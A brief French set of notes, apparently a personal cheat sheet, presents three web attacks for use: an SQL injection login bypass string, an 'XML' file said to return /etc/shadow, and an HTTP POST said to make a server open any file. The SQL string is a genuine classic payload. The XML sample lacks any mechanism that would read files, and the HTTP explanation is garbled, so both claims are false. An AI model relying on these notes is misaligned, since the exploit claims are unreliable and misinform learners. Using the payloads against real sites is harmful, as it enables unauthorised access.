### faille SQL  

language SQL reponse toujours vrai :  
````bash
'OR 1 =1--'  
````   
permet de contourner des mots de passe et autre faille dans une page web  

### faille XML  

Le site accepte des fichiers XML. Tu envoies un XML spécial qui contient une instruction pour lire un fichier sur le serveur.  
Exemple : Tu envoies un XML piégé et le serveur te retourne le contenu d'un fichier de configuration avec des mots de passe.  

````bash 
<?xml version="1.0" encoding="UTF-8"?>  
<root>  
    <meta name="source">/var/log/auth.log</meta>  
    <data id="payload">  
        <!-- This comment hides the real weapon -->  
        <file path="/etc/shadow"/>  
        <read mode="raw"/>  
    </data>  
</root>  
````  
### faille htpp (api)  

 coller ce minuscule bloc HTTP a la place de l url du site cela va  trompe le serveur qui interprète mal la limite entre deux paramètres, interprète un code hexadécimal comme un index surdimensionné et ouvre par conséquent un fichier qu'il n'était pas censé toucher, simplement parce qu'il a fait confiance aux longueurs et aux formats que vous lui avez fournis.  
 
 ````bash  
POST /api/theme HTTP/1.1  
Host: vulnerable-server.local  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 24  
theme_id=0xFF&csrf_token=randomval  
````  
ps: vous pouvez modifier le chemin pour ouvrir n import quelle fichier   
